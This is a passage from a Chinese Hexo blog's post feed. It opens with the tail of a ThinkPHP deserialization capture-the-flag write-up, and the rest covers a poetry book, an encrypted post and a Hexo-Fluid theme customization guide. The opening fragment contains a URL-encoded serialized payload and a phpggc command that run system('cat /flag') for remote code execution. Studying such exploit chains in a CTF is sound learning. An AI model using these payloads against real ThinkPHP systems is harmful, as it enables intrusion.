class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D <br></code></pre></td></tr></table></figure><p>简易解 用<a href="https://github.com/wh1t3p1g/phpggc">phpgcc</a>直接生成payload </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc -u ThinkPHP/RCE2 &#x27;system(&quot;cat /flag&quot;);&#x27;<br></code></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/160791504">https://zhuanlan.zhihu.com/p/160791504</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/105777872">https://blog.csdn.net/qq_42181428/article/details/105777872</a></p>]]></content>
    
    
    <categories>
      
      <category>审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分享-我是你流浪过的一个地方</title>
    <link href="/2022/02/15/%E5%88%86%E4%BA%AB-%E6%88%91%E6%98%AF%E4%BD%A0%E6%B5%81%E6%B5%AA%E8%BF%87%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9C%B0%E6%96%B9/"/>
    <url>/2022/02/15/%E5%88%86%E4%BA%AB-%E6%88%91%E6%98%AF%E4%BD%A0%E6%B5%81%E6%B5%AA%E8%BF%87%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9C%B0%E6%96%B9/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=888 height=90 src="//music.163.com/outchain/player?type=2&id=1457681678&auto=1&height=66"></iframe><p>​    最近情绪有点低落，清醒时做事，糊涂时读书。<br>​    今天分享的是《我是你流浪过的一个地方》这本书</p><h2 id="惭愧"><a href="#惭愧" class="headerlink" title="惭愧"></a>惭愧</h2><p>只有少数人爱我<br>我也只能去爱少数的人<br>也许，这就足够了<br>有太多的人和事物与我无关<br>我甚至不知道他们的存在或不存在<br>我简直不能喜欢一个讨厌的好人<br>不愿和一个肮脏的乞丐说说话<br>若碰上一个漂亮的女人<br>我的心情会突然变好起来<br>看吧，我的爱竟如此狭小<br>装不下多少东西<br>唯有惭愧越长越大</p><h2 id="春天来了"><a href="#春天来了" class="headerlink" title="春天来了"></a>春天来了</h2><p>春天来了，我该怎么办呢<br>我像个笨拙的孩子，手足无措<br>就像小时候有亲戚来到我家<br>带着他穿了花衣裳的小孩<br>我想和她玩，我想喊她<br>可我就是胆小，有点儿害怕<br>她也藏在大人的屁股后面<br>假装看天，偷偷看我</p><h2 id="故乡"><a href="#故乡" class="headerlink" title="故乡"></a>故乡</h2><p>就是那个你老想回去<br>却总也回不去的地方<br>就是那个你纵然回去<br>却把你当客人的地方<br>就是那个你老了死了<br>就变回一棵树的地方</p><h2 id="爷爷是个老头"><a href="#爷爷是个老头" class="headerlink" title="爷爷是个老头"></a>爷爷是个老头</h2><p>打我记事起，爷爷就是个老头<br>他那么老，好像从来不曾年轻过<br>他那么老，好像生来只为了做我的爷爷<br>可我从未认真想过他有一天会死<br>我总认为，一个人再老，总可以再活一年吧<br>然而有一天他还是死了，就像土垛的院墙<br>风雨多了，总有一天会塌下来<br>没了。完了。他的一生我也知道的很少<br>他说过一些，我记不太起来<br>就像他爱我很多，我只是喊他声爷爷</p><h2 id="月亮在说我说你"><a href="#月亮在说我说你" class="headerlink" title="月亮在说我说你"></a>月亮在说我说你</h2><p>爱情扶我上路，然后走开<br>让我一生怀念<br>怀念那一扶的久长<br>和一生的短暂</p><p>黑白色的夜里，我想看看月亮<br>我看见月亮很好，就像我当初<br>看见你很好一样<br>那永不回来的日子渐渐褪色<br>在月亮下悄然响起<br>我知道，它是在说我，说你</p><p>此生已决定不和你相遇<br>因为我，如此地想你<br>只有彼此珍重，各度遥远一生<br>我听见月亮还说—<br>思念着，是寂寞的<br>爱着，是美丽的</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于这段时间一些问题的思考</title>
    <link href="/2022/02/15/%E5%85%B3%E4%BA%8E%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/2022/02/15/%E5%85%B3%E4%BA%8E%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="7fed5540cc05dba2150df4109a143e28852ff9226b165084d3ce27ff9afd0597">4c7faee63f1acc4b4b483b6847cd0adce6fd8920bc1f626ae38ae4f7bd94902086a9f53e4467a624692f6f27a9651bf9de7ac21445d4d5136322f92fec2921da6f1e5009d739d7143da01b3f8ed0db8f3849cf6d77415318e482eaa87739713239723a6309d71490acf8ed7fe6791312fd016c5c822a63b36635f2613397378e119b61f7150dd95bec8f9d573005e7e386b9974e7cc6c3c1735dfb1af790970821d2b8c610bd93030294aa560d9b4a5db649e240f86fd4b17c899b71291231e5c80a1a99e54704bba9a27d18d4d790b333c6532a3727e3f2e00463c6d7840856e35750a80602512ab857e1908c2249607848c58a4dd703d9074b8473ce5e82b7c3fc2c90dbbc959379e2ac934fa0b4adf16ed2cf8ebab397aab91ade08c9d519d40df07973c7019c221f088ef8456f216e8949cfd5718c5581eaac7bd68da33192838f84c4720582cb3407c800074fff904fd46c6d95d67d2a8838817ac07751c4423366eb9aedcca7968831e2019a671c7830491f69b23202285dd1f0ce47305bed7ba9a33229bdf6d1827237520c6c0c74a8a6d708fc89864020a3e17b5cb21630bfff20aa93fbd5b986296cbb3b35fa499caf49c948f1d1b6da9275f8840ff765bdf6cce9139796a05aa98e009e527406a632ec42cf3a9c4c16f85124588d8cbbbced4b4a8e47197ed387ee68a345b7369874dadb627476b3c7511b316797b2b6d8cc0b986abed5e59441c89905ea5979941939ab8fb4490ec37151b85188ca82acc0af56386e3c25af21fb5e87faab3b3de0f0bb79db064502cb687ff485dbff0bbbe2df1fcb2be646d1d1d77a25408551903334f6c967075b4cfd62b9a64d3e0b6d56b37db034f13634eb2d70fc4cb185ee842c2d96ea96b53b1a3263d5bd83a995c57d4ed002a81000028c796daaee23120fdd85d88767e6c4adde90883f07358031b914d78cc870da6c3a9dd810467652e387920ac129b5cac159c8cc9c2058048578654384d6ee108e6349b707faba8cc2beda89f9291e0bae4dfb4e62dadace6c5c6f80cbd87c1342c73f3600af770706b8341fa005c94a74f74e811c1272abf283d0523b90b90a86eb3be53d329da8b15ff6c2c1e5e639f764c31003b8b2bcaa2574bee8a8b78f966a19f5f6239dd25183c34afc832f477c42be39b976aaa3cb7c088a4c1ff91700fe90f61931df84df9537694aec6dabbc8bd6a22cd2bd3d514587c89ef4a0edce7504eae8b42e09da28da2fd445eef3bf2a82b8b4a2fecccbd22e00f436805b9e6d2f6dbaf7601fa27e75fd8f47eb6d9a9f544adaab3e80ac08a1b293b120e7736f31d175ffca714f5330a124f2771c5d2d38c6c665f1ddc9ea812250e9540c1981cc1b758289435ddc7a2fb9f6653b23122ea7bb735fcd177e4fb78db998fa1759fc97a6b753761125d9b59d7aaf54d4d5eea0afbad6c81ee1651366cfe388e9f8942ab7e396c6fdda619661947b4439984d69e34f79ca3133985adc5a09b992c74e6d837cc983b6ceeca44eda6c42749fc7b4a5c81e19dad830753210d79519189c3fee3de996b9e3cfc765e937111658d8ae4905ec76a14d7aa685010089a63c7a0b03ad693ad13bc93360d41b31cfbceb663bcc8e088b7ba7d20f1e237769a9ac2df729cf2a22a53c753e41b0f1bc859afccf95bb56e4ee1ac7460d5a0d14ce80ab6d7caf3863bd322ce0551aad7ff8a3b7c2dec41b2289631a7960eff9954407d2db7c05d28f4c545cacf3c88bd9f98cc486ef7f88a9c4b954b2c8a5f8137fbc3300cc70f71e1b48cbe84d5560bde14c6bfed7b4af98ae79c9c63e6308010035b2d813c1d24b3fe14eeb471c039ff0af681b6bdd9875273937e4826cceffcf15525e18b9f2f5e4cd56c9dcdc8f9d840687ce545a4675eb220defb825d9cc97011294160d362b6febb781ad7d2196a528720046f14a82429a6247862ba8a69746ab24e569b4d5b36a4238dfd93b5b81cbe152c5f56336ada9153dd55f5ca7903094d35f8012f4215f79743784fd521c32f01147e7563d05a3842e188c12ee1e0dad47db378b125072d2e0e4af82ee76739406d8e1e7a81d2e1a8d37bbe798b346105971484ca05d4f8214559e5ee9987986356c80a1f796e8c847f23bc4b5cc4b2db510c822ff8f0109fbace1331a8ebb2107d3601e90981fc4fd1dbdfa67ca5c08db38f6731e1b1990c7ef06ce0bbb5d8878a6c676eb791b571bca4cbf967c3ef10011c070c77f05b3e09d3842cdb37bbb8a32240b14bf0d0ec177d17fbbe34d7842faeb3c76684df0bfe433fdf1a8ed5baec5e658bd76a8712d17377a4b6c935626a0255811398f63e246f336d992439f909b7cfb8d962d1ffd82a1f6497ce2edb96a4b50c64f61f2966aa66b1fcd311a555bf6e1f5723483616d95771e7228239da7e043afda2ded40ee29cc1bc66ffb46abc3487488ef7b16d2a73d3d932317ca707d9443549153181421a295eb2259a2f5e7040786d08b204c9dff665a389a9e2efc334f03ab28eef61ca2edfdbcc17399bad2a9601ee423dc2a41bdddbc1cd95f22f65fca332612e3bea3087eacbbd18e1f07a15e6dc84546f72ed5f0b91c2678a8a4e2f42489519741a03a302dccdf84ccc8534cdc5875be538fa46b991eee9b915114a77247cd4292b77c3e5d4cabc3bd3fd99a1ddf60545686f0647b9c1a6a13f081f1765b74acc786ed275202a2035c1bc6690bf6051f7ec4074c55f28d02dd4fca68012c942040efac426d665a5262892e79109d757599f8c373dbc2180ef58ec77051ba3d2ca1ededcb7c53e783204ad1ba6eca2d7fc3c030b80cc30b37fd57d6838c812d130b68f339698378d03ed574ad7c173022d347e50f3a94c89a09547d7be5d599d2922233a753dc816c90201c380a5cffc98cab70fe151fd15113867112048fb4deaea0bb8259eaf0a900c50521c6955b9ef708e21d1563cd461380cd2f2fa79579e285595f3d8ab93ba931d4487fa945de6092b3ab5918dbc60d27669f8a7bdceb658855ff0dc0c971d5bdee753e8049859ab4f1112e6aed3cc13ffb49a63a959c1249959e20f7ba891ea43de94f51c336424ac984b4aebf1af08a25f41ab7ac28908d0753a6c5164cae4dfa6972ba0b85d13d7d4f9ba9beaadafd30534f124e6b32b22ee005b79bbb0ee6508efad22d864d9f18b19716e74f0f3c8f578f4b10f05c1d8ebe1ceda5ae5e6c4d19dc500c3bc55fc9794b90a4d51772fa47f88f0afc90537c8eb0f5ca5c44639a5ede4bba66ec5e1700510a1e52c238d4c60412e90e1b597fd1ea5cd54f99b807dbe9ba97665fe69a0dc25912332617f271acbb2f5f9c3e8027e385bfe8bc781500aa82e9282b26995d21e0d0913e669ba9613565c0c3f12641df9bf0b486ffaacdf40cff1db2fe63faeb8889a5d02683e3484104e72ed68ffcccd7a00ee4671dfb1b1b8a3ba868d675e2d5cc18c9d6a7bb234cc20b525ea54547f01d9aad340016415b328500b6a40c16937874e57d4fadfe0cbe0a29fff58fe1caee1e0b608dd798960ed6127001bef75fb56b153d6f9704d2f9901e1a7f6a891f30ce6b655d2cf7953b5bcca110cd7cacf64662cd411289847bf249dee069c98a9070aa53a00773b1c34fddc8dea98e2dfe2adb08c4470924fefb7f3c5a88acdf00b54f0fb2aedae558803ae82a0bf010b3b90712639a4c656497b974c90459ad4dd27edcbe674f9061ab21f409be9126ec6de11b29051ff8da1786572efa621b6e534fbf131121956e378369ab49106d82862558dcd31e42e8dcc04282fca51cfe761b80cbcda48dcdc0eb0bf03f062430a82d35ecfe56c39f5da6a3df8fa515988cb8390497fff78ca6db900877c1a4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您需要密码才能查看这篇文章。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo 美化指北</title>
    <link href="/2022/02/12/Hexo-%E7%BE%8E%E5%8C%96%E6%8C%87%E5%8C%97/"/>
    <url>/2022/02/12/Hexo-%E7%BE%8E%E5%8C%96%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Hexo-美化指北"><a href="#Hexo-美化指北" class="headerlink" title="Hexo 美化指北"></a>Hexo 美化指北</h1><p>主题：Hexo-Fluid</p><p>仓库地址: <a href="https://github.com/fluid-dev/hexo-theme-fluid.git">https://github.com/fluid-dev/hexo-theme-fluid.git</a></p><p>用户文档：<a href="https://hexo.fluid-dev.com/docs/">https://hexo.fluid-dev.com/docs/</a></p><p>这里会写的比较糙，尽量看不难。</p><h2 id="官方优化选项"><a href="#官方优化选项" class="headerlink" title="官方优化选项"></a>官方优化选项</h2><p>先看看官方文档给了哪些值得拿来优化的选项，整理了一下有：</p><ul><li><p>懒加载 - 提高访问速度</p></li><li><p>打字机</p></li><li><p>文章摘要 </p></li><li><p>Front matter - 涉及文章的tag,categories</p></li><li><p>覆盖配置 - 以后只更新<code>_config.fluid.yml </code> 会方便很多</p></li><li><p>文章跳转方式</p></li><li><p>评论插件</p></li></ul><p> 这些自己直接看文档就好，已经很详细了</p><h2 id="资源替换"><a href="#资源替换" class="headerlink" title="资源替换"></a>资源替换</h2><p>对于 <code>_config.fluid.yml</code> 是按照每个页面的配置选项进行工作的。</p><h3 id="顶部资源大图替换"><a href="#顶部资源大图替换" class="headerlink" title="顶部资源大图替换"></a>顶部资源大图替换</h3><p>来到配置文件，比如更新首页的资源那么有</p><figure class="highlight yml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">index:</span><br>  <span class="hljs-comment"># 首页 Banner 头图，可以是相对路径或绝对路径，以下相同</span><br>  <span class="hljs-comment"># Path of Banner image, can be a relative path or an absolute path, the same on other pages</span><br>  <span class="hljs-comment"># banner_img: /img/default.png   默认选项</span><br>  <span class="hljs-attr">banner_img:</span> <span class="hljs-string">/img/bg/desert.jpg</span>   <span class="hljs-comment"># 对应存放在 /source/img/bg/desert.jpg</span><br></code></pre></td></tr></table></figure><h3 id="页面子标题"><a href="#页面子标题" class="headerlink" title="页面子标题"></a>页面子标题</h3><p>修改 <code>\hexo\themes\hexo-theme-fluid\languages\zh-CN.yml</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">archive:</span><br>  <span class="hljs-attr">title:</span> <span class="hljs-string">时间线</span><br>  <span class="hljs-attr">subtitle:</span> <span class="hljs-string">时间线</span><br></code></pre></td></tr></table></figure><p>修改  <code>_config.fluid.yml</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">archive:</span><br>  <span class="hljs-attr">banner_img:</span> <span class="hljs-string">/img/bg/desert.jpg</span><br>  <span class="hljs-comment">#banner_img: /img/bg/kungfu.jpg</span><br>  <span class="hljs-attr">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-attr">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-attr">subtitle:</span> <span class="hljs-string">时间线</span><br></code></pre></td></tr></table></figure><h2 id="页脚优化"><a href="#页脚优化" class="headerlink" title="页脚优化"></a>页脚优化</h2><p>修改 <code>\hexo\themes\hexo-theme-fluid\layout\_partial\footer.ejs</code></p><p>这里实现运行时间显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;footer class=&quot;text-center mt-5 py-3&quot;&gt;<br>  &lt;div class=&quot;footer-content&quot;&gt;<br>    &lt;div&gt;<br>      &lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;<br>      &lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;<br>      &lt;script&gt;<br>      var now = new Date();<br>      function createtime()&#123;<br>          var grt= new Date(&quot;00/00/1970 00:00:00&quot;);//此处修改你的建站时间或者网站上线时间<br>          now.setTime(now.getTime()+250);<br>          days = (now - grt ) / 1000 / 60 / 60 / 24;<br>          dnum = Math.floor(days);<br>          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);<br>          hnum = Math.floor(hours);<br>          if(String(hnum).length ==1 )&#123;<br>              hnum = &quot;0&quot; + hnum;<br>          &#125;<br>          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);<br>          mnum = Math.floor(minutes);<br>          if(String(mnum).length ==1 )&#123;<br>                    mnum = &quot;0&quot; + mnum;<br>          &#125;<br>          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);<br>          snum = Math.round(seconds);<br>          if(String(snum).length ==1 )&#123;<br>                    snum = &quot;0&quot; + snum;<br>          &#125;<br>          document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;🚀 &amp;nbsp;&quot;+dnum+&quot;&amp;nbsp天&quot;;  //此次自定义显示内容<br>          document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot;&amp;nbsp小时&amp;nbsp&quot; + mnum + &quot;&amp;nbsp分&amp;nbsp&quot; + snum + &quot;&amp;nbsp秒&quot;;<br>      &#125;<br>      setInterval(&quot;createtime()&quot;,250);<br>      &lt;/script&gt;<br>    &lt;/div&gt;<br>  &lt;/div&gt;<br>    div&gt;©2022&lt;a href=&quot;/&quot;&gt;&amp;nbsp;&amp;nbsp;blogname&lt;/a&gt;&lt;/div&gt;<br></code></pre></td></tr></table></figure><h2 id="访问统计"><a href="#访问统计" class="headerlink" title="访问统计"></a>访问统计</h2><p>推荐用busuanzi，虽然我调试的时候调了很久而且有时候容易失效，但是人家两行代码不需要域名绑定</p><p>修改 <code>\hexo\themes\hexo-theme-fluid\layout\_partial\footer.ejs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;!-- 不蒜子统计 --&gt;<br>  &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;<br>        &lt;span &gt;本站总访问量：<br>        &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;<br></code></pre></td></tr></table></figure><h2 id="修改你的滚动条"><a href="#修改你的滚动条" class="headerlink" title="修改你的滚动条"></a>修改你的滚动条</h2><p>新建 <code>hexo\themes\hexo-theme-fluid\source\css\scroll.styl</code></p><p>填入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs css">::-webkit-scrollbar &#123;<br>  width: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">6px</span>;<br>&#125;<br><br>::-webkit-scrollbar-thumb &#123;<br>  background-color: <span class="hljs-number">#a6a6a6</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">1rem</span>;<br>  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">60px</span>;<br><br>  &amp;<span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#757575</span>;<br>  &#125;<br><br>  &amp;<span class="hljs-selector-pseudo">:active</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#424242</span>;<br>  &#125;<br>&#125;<br><br>::-webkit-scrollbar-corner &#123;<br>  background-color: transparent;<br>&#125;<br><br><span class="hljs-selector-attr">[data-user-color-scheme=<span class="hljs-string">&#x27;dark&#x27;</span>]</span> &#123;<br>  ::-webkit-scrollbar-thumb &#123;<br>    background-color: <span class="hljs-number">#687582</span>;<br><br>    &amp;<span class="hljs-selector-pseudo">:hover</span> &#123;<br>      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#9da8b3</span>;<br>    &#125;<br><br>    &amp;<span class="hljs-selector-pseudo">:active</span> &#123;<br>      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#c5d0db</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>随后在 <code>_config.fluid.yml</code> 应用你的更改</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment"># 指定自定义 .css 文件路径，用法和 custom_js 相同</span><br><span class="hljs-comment"># The usage is the same as custom_js</span><br><span class="hljs-attr">custom_css:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">/css/scroll</span><br><br></code></pre></td></tr></table></figure><h2 id="更换字体"><a href="#更换字体" class="headerlink" title="更换字体"></a>更换字体</h2><p>思源宋体牛逼</p><p>在 <code>hexo\themes\hexo-theme-fluid\layout\_partial\head.ejs</code>  添加 在 <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code> 之下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;link href=&quot;https://fonts.proxy.ustclug.org/css2?family=Noto+Serif+SC&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;<br></code></pre></td></tr></table></figure><p>随后在 <code>hexo\themes\hexo-theme-fluid\source\css\variables\base.styl</code>添加字体 作用语句是下代码块的第四行 添加上 Noto Serif SC 即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> Font<br><span class="hljs-variable">$font</span>-size = theme-config(<span class="hljs-string">&quot;font.font_size&quot;</span>, <span class="hljs-string">&quot;16px&quot;</span>)<br><span class="hljs-variable">$letter</span>-spacing = theme-config(<span class="hljs-string">&quot;font.letter_spacing&quot;</span>, <span class="hljs-string">&quot;0.02em&quot;</span>)<br><span class="hljs-variable">$font</span>-family = theme-config(<span class="hljs-string">&quot;font.font_family&quot;</span>, <span class="hljs-string">&#x27;&quot;Noto Serif SC&quot;,var(--font-family-sans-serif)&#x27;</span>)   <br></code></pre></td></tr></table></figure><p>最后我在 <code>_config.fluid.yml</code> 修改了如下选项</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">font</span>:<br>  <span class="hljs-attribute">font_size</span>: <span class="hljs-number">18px</span><br>  <span class="hljs-attribute">font_family</span>: Noto Serif SC<br>  <span class="hljs-attribute">custom_css</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//fonts.proxy.ustclug.org/css2?family=Noto+Serif+SC&amp;display=swap</span><br>  <span class="hljs-attribute">letter_spacing</span>: <span class="hljs-number">0.02em</span><br>  <span class="hljs-attribute">code_font_size</span>: <span class="hljs-number">85%</span><br></code></pre></td></tr></table></figure><p>如果你的更改仅在本地生效，尝试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo clean<br>hexo g -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编程做题记录</title>
    <link href="/2022/02/11/Leetcode-20%E5%A4%A9%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92%E4%B9%8B%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"/>
    <url>/2022/02/11/Leetcode-20%E5%A4%A9%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92%E4%B9%8B%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/</url>
    
